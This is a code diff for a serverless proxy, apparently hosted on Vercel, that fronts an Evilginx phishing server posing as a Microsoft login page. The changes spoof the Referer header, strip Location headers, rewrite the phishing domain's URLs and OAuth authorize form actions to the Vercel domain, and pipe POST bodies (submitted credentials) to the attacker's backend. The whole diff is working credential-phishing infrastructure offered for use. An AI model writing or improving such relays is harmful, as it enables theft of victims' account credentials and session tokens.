@@ -12,7 +12,8 @@ export default async function handler(req, res) {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.9',
     'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
-    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1'
+    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1',
+    'Referer': `https://aa-iido.vercel.app${req.url}`
   };
 
   const options = {
@@ -29,6 +30,9 @@ export default async function handler(req, res) {
     const proxyReq = https.request(options, (proxyRes) => {
       // Filter response headers
       const responseHeaders = { ...proxyRes.headers };
+      
+      // Remove headers that might cause redirects
+      delete responseHeaders['location'];
       delete responseHeaders['content-length'];
       delete responseHeaders['transfer-encoding'];
       
@@ -42,14 +46,19 @@ export default async function handler(req, res) {
         const transformer = new Transform({
           transform(chunk, encoding, callback) {
             let data = chunk.toString();
+            
+            // Rewrite ALL Evilginx URLs to Vercel domain
             data = data.replace(
-              /https:\/\/login\.espeharete\.top/g,
-              'https://aa-iido.vercel.app'
+              /https:\/\/login\.espeharete\.top(\/[^"']*)/g,
+              'https://aa-iido.vercel.app$1'
             );
+            
+            // Special handling for OAuth redirects
             data = data.replace(
-              /https:\/\/aadcdn\.espeharete\.top/g,
-              'https://aa-iido.vercel.app/aadcdn'
+              /action="https:\/\/login\.espeharete\.top\/common\/oauth2\/v2\.0\/authorize/g,
+              'action="https://aa-iido.vercel.app/common/oauth2/v2.0/authorize'
             );
+            
             this.push(data);
             callback();
           }
@@ -80,6 +89,7 @@ export default async function handler(req, res) {
       resolve();
     });
 
+    // Forward request body if present
     if (req.method === 'POST' || req.method === 'PUT') {
       req.pipe(proxyReq);
     } else {
